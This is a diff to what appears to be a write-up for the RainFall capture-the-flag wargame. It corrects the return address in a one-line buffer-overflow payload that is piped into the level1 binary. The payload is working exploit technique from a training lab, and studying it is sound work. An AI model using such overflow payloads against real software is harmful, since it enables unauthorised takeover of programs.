@@ -85,5 +85,5 @@ Exit back to user level1, then run the binary.
 ```
 level2@RainFall:~$ exit
 exit
-level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | /home/user/level2/level1_source
+level1@RainFall:~$ (python -c 'print "a"*76 + "\x64\x84\x04\x08"'; cat) | /home/user/level2/level1_source
 ```
